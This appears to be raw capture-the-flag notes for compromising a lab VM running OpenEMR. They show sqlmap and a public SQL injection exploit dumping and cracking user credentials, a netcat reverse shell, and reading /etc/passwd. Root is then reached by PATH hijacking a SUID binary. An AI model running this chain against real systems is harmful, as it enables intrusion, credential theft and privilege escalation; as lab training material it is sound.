@@ -1,0 +1,383 @@
+dirsearch -w directory-2.3-big 
+
+# $Id: robots.txt 410967 2009-08-06 19:44:54Z oden $
+
+# $HeadURL: svn+ssh://svn.mandriva.com/svn/packages/cooker/apache-conf/current/SOURCES/robots.txt $
+# exclude help system from robots
+User-agent: *
+Disallow: /manual/
+Disallow: /manual-2.2/
+Disallow: /addon-modules/
+Disallow: /doc/
+Disallow: /images/
+# the next line is a spam bot trap, for grepping the logs. you should _really_ change this to something else...
+Disallow: /all_our_e-mail_addresses
+# same idea here...
+Disallow: /admin/
+# but allow htdig to index our doc-tree
+#User-agent: htdig
+#Disallow:
+# disallow stress test
+user-agent: stress-agent
+Disallow: /
+
+http://192.168.56.113/robots.txt
+
+
+
+
+ python3 49742.py
+/home/ed/Downloads/49742.py:15: SyntaxWarning: invalid escape sequence '\_'
+  print("""
+
+   ____                   ________  _______     __ __   ___ ____ 
+  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \
+ / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
+/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ / 
+\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/  
+    /_/
+    ____  ___           __   _____ ____    __    _               
+   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)              
+  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /               
+ / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /                
+/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike 
+
+[+] Finding number of users...
+[+] Found number of users: 2
+[+] Extracting username and password hash...
+admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
+medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d  
+ab24aed5a7c4ad45615cd7e0da816eea39e4895d	sha1	medical
+
+sqlmap -u 'http://192.168.56.115/openemr/interface/login/validateUser.php?u=' --dbs
+
+[05:29:54] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux
+web application technology: PHP 5.3.3, Apache 2.2.17
+back-end DBMS: MySQL >= 5.0
+[05:29:54] [INFO] fetching database names
+[05:29:54] [INFO] retrieved: 'information_schema'
+[05:29:54] [INFO] retrieved: 'openemr'
+[05:29:54] [INFO] retrieved: 'test'
+available databases [3]:
+[*] information_schema
+[*] openemr
+[*] test
+
+sqlmap -u 'http://192.168.56.115/openemr/interface/login/validateUser.php?u=' -D openemr --tables
+
+atabase: openemr
+[141 tables]
++---------------------------------+
+| array                           |
+| groups                          |
+| log                             |
+| version                         |
+| addresses                       |
+| amc_misc_data                   |
+| ar_activity                     |
+| ar_session                      |
+| audit_details                   |
+| audit_master                    |
+| automatic_notification          |
+| batchcom                        |
+| billing                         |
+| categories                      |
+| categories_seq                  |
+| categories_to_documents         |
+| chart_tracker                   |
+| claims                          |
+| clinical_plans                  |
+| clinical_plans_rules            |
+| clinical_rules                  |
+| code_types                      |
+| codes                           |
+| config                          |
+| config_seq                      |
+| customlists                     |
+| documents                       |
+| documents_legal_categories      |
+| documents_legal_detail          |
+| documents_legal_master          |
+| drug_inventory                  |
+| drug_sales                      |
+| drug_templates                  |
+| drugs                           |
+| eligibility_response            |
+| eligibility_verification        |
+| employer_data                   |
+| enc_category_map                |
+| extended_log                    |
+| facility                        |
+| fee_sheet_options               |
+| form_dictation                  |
+| form_encounter                  |
+| form_misc_billing_options       |
+| form_reviewofs                  |
+| form_ros                        |
+| form_soap                       |
+| form_vitals                     |
+| forms                           |
+| gacl_acl                        |
+| gacl_acl_sections               |
+| gacl_acl_seq                    |
+| gacl_aco                        |
+| gacl_aco_map                    |
+| gacl_aco_sections               |
+| gacl_aco_sections_seq           |
+| gacl_aco_seq                    |
+| gacl_aro                        |
+| gacl_aro_groups                 |
+| gacl_aro_groups_id_seq          |
+| gacl_aro_groups_map             |
+| gacl_aro_map                    |
+| gacl_aro_sections               |
+| gacl_aro_sections_seq           |
+| gacl_aro_seq                    |
+| gacl_axo                        |
+| gacl_axo_groups                 |
+| gacl_axo_groups_map             |
+| gacl_axo_map                    |
+| gacl_axo_sections               |
+| gacl_groups_aro_map             |
+| gacl_groups_axo_map             |
+| gacl_phpgacl                    |
+| geo_country_reference           |
+| geo_zone_reference              |
+| globals                         |
+| gprelations                     |
+| history_data                    |
+| immunizations                   |
+| insurance_companies             |
+| insurance_data                  |
+| insurance_numbers               |
+| integration_mapping             |
+| issue_encounter                 |
+| lang_constants                  |
+| lang_custom                     |
+| lang_definitions                |
+| lang_languages                  |
+| layout_options                  |
+| lbf_data                        |
+| list_options                    |
+| lists                           |
+| lists_touch                     |
+| notes                           |
+| notification_log                |
+| notification_settings           |
+| onotes                          |
+| openemr_module_vars             |
+| openemr_modules                 |
+| openemr_postcalendar_categories |
+| openemr_postcalendar_events     |
+| openemr_postcalendar_limits     |
+| openemr_postcalendar_topics     |
+| openemr_session_info            |
+| patient_access_offsite          |
+| patient_access_onsite           |
+| patient_data                    |
+| patient_reminders               |
+| payments                        |
+| pharmacies                      |
+| phone_numbers                   |
+| pma_bookmark                    |
+| pma_column_info                 |
+| pma_history                     |
+| pma_pdf_pages                   |
+| pma_relation                    |
+| pma_table_coords                |
+| pma_table_info                  |
+| pnotes                          |
+| prescriptions                   |
+| prices                          |
+| procedure_order                 |
+| procedure_report                |
+| procedure_result                |
+| procedure_type                  |
+| registry                        |
+| rule_action                     |
+| rule_action_item                |
+| rule_filter                     |
+| rule_patient_data               |
+| rule_reminder                   |
+| rule_target                     |
+| sequences                       |
+| standardized_tables_track       |
+| syndromic_surveillance          |
+| template_users                  |
+| transactions                    |
+| user_settings                   |
+| users                           |
+| users_facility                  |
+| x12_partners                    |
++---------------------------------+
+
+sqlmap -u 'http://192.168.56.115/openemr/interface/login/validateUser.php?u=' -D openemr -T users --dump
+
+[05:32:56] [INFO] cracked password 'ackbar' for user 'admin'                                       
+[05:32:59] [INFO] cracked password 'medical' for user 'medical'  
+
+└─$ nc -nvlp 8821 
+listening on [any] 8821 ...
+connect to [192.168.56.108] from (UNKNOWN) [192.168.56.113] 37714
+Linux localhost.localdomain 2.6.38.8-pclos3.bfs #1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686 i686 i386 GNU/Linux
+ 08:40:59 up  1:50,  0 users,  load average: 1.16, 1.16, 1.21
+USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=479(apache) gid=416(apache) groups=416(apache)
+sh: no job control in this shell
+sh-4.1$ python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+su medical
+Password: medical
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/bin/sh
+daemon:x:2:2:daemon:/sbin:/bin/sh
+adm:x:3:4:adm:/var/adm:/bin/sh
+lp:x:4:7:lp:/var/spool/lpd:/bin/sh
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/bin/sh[medical@localhost /]$ cd /tmp
+cd /tmp
+[medical@localhost tmp]$ echo "/bin/bash" > fdisk
+echo "/bin/bash" > fdisk
+news:x:9:13:news:/var/spool/news:/bin/sh
+uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
+operator:x:11:0:operator:/var:/bin/sh
+games:x:12:100:games:/usr/games:/bin/sh
+nobody:x:65534:65534:Nobody:/:/bin/sh
+rpm:x:499:499:system user for rpm:/var/lib/rpm:/bin/false
+avahi:x:498:498:system user for avahi:/var/avahi:/bin/false
+avahi-autoipd:x:497:497:system user for avahi:/var/avahi:/bin/false
+messagebus:x:496:496:system user for dbus:/:/sbin/nologin
+haldaemon:x:495:495:system user for hal:/:/sbin/nologin
+vcsa:x:69:494:virtual console memory owner:/dev:/sbin/nologin
+polkituser:x:494:490:system user for policykit:/:/sbin/nologin
+uuidd:x:493:489:system user for util-linux-ng:/var/lib/libuuid:/bin/false
+mysql:x:492:488:system user for mysql:/var/lib/mysql:/bin/bash
+sshd:x:491:485:system user for openssh:/var/empty:/bin/true
+rtkit:x:489:483:system user for rtkit:/proc:/sbin/nologin
+rpc:x:488:482:system user for rpcbind:/var/lib/lib/rpcbind:/sbin/nologin
+rpcuser:x:487:481:system user for nfs-utils:/var/lib/lib/nfs:/bin/false
+ntp:x:486:480:system user for ntp:/etc/ntp:/bin/false
+xfs:x:485:479:system user for xfs:/etc/X11/fs:/bin/false
+saned:x:484:478:system user for saned:/home/saned:/bin/false
+squid:x:483:420:system user for squid:/var/spool/squid:/bin/false
+dansguardian:x:482:419:system user for dansguardian:/var/lib/dansguardian:/bin/false
+gdm:x:481:418:system user for gdm:/var/lib/gdm:/bin/false
+usbmux:x:480:417:system user for usbmuxd:/proc:/sbin/nologin
+medical:x:500:500:PCLinuxOS Medical:/home/medical:/bin/bash
+apache:x:479:416:system user for httpd-conf:/var/www:/bin/sh
+ftp:x:478:415:system user for proftpd:/var/ftp:/bin/false
+almirant:x:501:502:Almirant:/home/almirant:/bin/bash
+[medical@localhost ~]$ 
+
+[medical@localhost ~]$ find / -perm -u=s 2>/dev/null
+find / -perm -u=s 2>/dev/null
+/usr/libexec/pt_chown
+/usr/lib/ssh/ssh-keysign
+/usr/lib/polkit-resolve-exe-helper
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/lib/chromium-browser/chrome-sandbox
+/usr/lib/polkit-grant-helper-pam
+/usr/lib/polkit-set-default-helper
+/usr/sbin/fileshareset
+/usr/sbin/traceroute6
+/usr/sbin/usernetctl
+/usr/sbin/userhelper
+/usr/bin/crontab
+/usr/bin/at
+/usr/bin/pumount
+/usr/bin/batch
+/usr/bin/expiry
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/wvdial
+/usr/bin/pmount
+/usr/bin/sperl5.10.1
+/usr/bin/gpgsm
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/gpg
+/usr/bin/healthcheck
+/usr/bin/Xwrapper
+
+[medical@localhost almirant]$ cat user.txt*
+cat user.txt*
+d41d8cd98f00b204e9800998ecf8427e
+
+strings /usr/bin/healthcheck*
+__libc_start_main
+GLIBC_2.0
+PTRhp
+[^_]
+clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
+
+[medical@localhost /]$ cd /tmp
+cd /tmp
+[medical@localhost tmp]$ echo "/bin/bash" > fdisk
+echo "/bin/bash" > fdisk
+
+[medical@localhost tmp]$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+[medical@localhost tmp]$ echo $PATH
+echo $PATH
+/tmp:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin
+[medical@localhost tmp]$ ls -la /usr/bin/healthcheck
+ls -la /usr/bin/healthcheck
+-rwsr-sr-x 1 root root 5813 Jul 29  2020 /usr/bin/healthcheck*
+[medical@localhost tmp]$ /usr/bin/healthcheck          
+/usr/bin/healthcheck
+TERM environment variable not set.
+System Health Check
+
+Scanning System
+eth1      Link encap:Ethernet  HWaddr 08:00:27:4D:9F:60  
+          inet addr:192.168.56.116  Bcast:192.168.56.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fe4d:9f60/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2132 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4920 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:260692 (254.5 KiB)  TX bytes:33139706 (31.6 MiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
+
+[root@localhost tmp]# id
+id
+uid=0(root) gid=0(root) groups=0(root),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(users),490(polkituser),500(medical),501(fuse)
+[root@localhost tmp]# cd /rrot
+cd /rrot
+bash: cd: /rrot: No such file or directory
+[root@localhost tmp]# cd /root
+cd /root
+[root@localhost root]# ls
+ls
+Desktop/    drakx/        healthcheck.c  sudo.rpm
+Documents/  healthcheck*  root.txt       tmp/
+[root@localhost root]# cat root.txt
+cat root.txt
+██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
+ ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
+  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
+   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
+   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
+                                                                                                                          
+                                                                                                                          
+Thanks for Playing!
+
+Follow me at: http://v1n1v131r4.com
+
+
+root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
